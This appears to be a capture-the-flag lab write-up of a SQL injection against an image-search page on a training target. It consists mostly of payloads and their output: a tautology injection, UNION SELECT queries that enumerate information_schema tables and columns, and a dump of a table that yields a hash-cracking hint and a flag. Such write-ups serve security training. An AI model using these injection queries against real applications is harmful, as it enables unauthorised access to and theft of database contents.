ID: 1 OR 1=1# 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
ID: 1 OR 1=1# 
Title: 42 !
Url : https://fr.wikipedia.org/wiki/Fichier:42
ID: 1 OR 1=1# 
Title: Google
Url : https://fr.wikipedia.org/wiki/Logo_de_Go
ID: 1 OR 1=1# 
Title: Earth
Url : https://en.wikipedia.org/wiki/Earth#/med
ID: 1 OR 1=1# 
Title: Hack me ?
Url : borntosec.ddns.net/images.png

look for image-related tables/databases:

> 0 UNION SELECT table_name, table_schema FROM information_schema.tables--

ID: 0 UNION SELECT table_name, table_schema FROM information_schema.tables-- 
Title: Member_images
Url : list_images 

table_schema/database: Member_images
table_name: list_images

So now enumerate the columns for that table looking for columns like:

id
url
title
comment

> 0 UNION SELECT column_name, table_name FROM information_schema.columns--

ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
Title: list_images
Url : id
ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
Title: list_images
Url : url
ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
Title: list_images
Url : title
ID: 0 UNION SELECT column_name, table_name FROM information_schema.columns-- 
Title: list_images
Url : comment

> 0 UNION SELECT title, comment FROM Member_images.list_images-- 


ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
Title: An image about the NSA !
Url : Nsa
ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
Title: There is a number..
Url : 42 !
ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
Title: Google it !
Url : Google
ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
Title: Earth!
Url : Earth
ID: 0 UNION SELECT title, comment FROM Member_images.list_images-- 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?


1928e8083cf461a51303633093573c46 (md5) ==> albatroz  ==> 9d6595be092a4952c7ec90b44aadd3015090a687bc74531074fac06652c16a3a (sh256) 
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
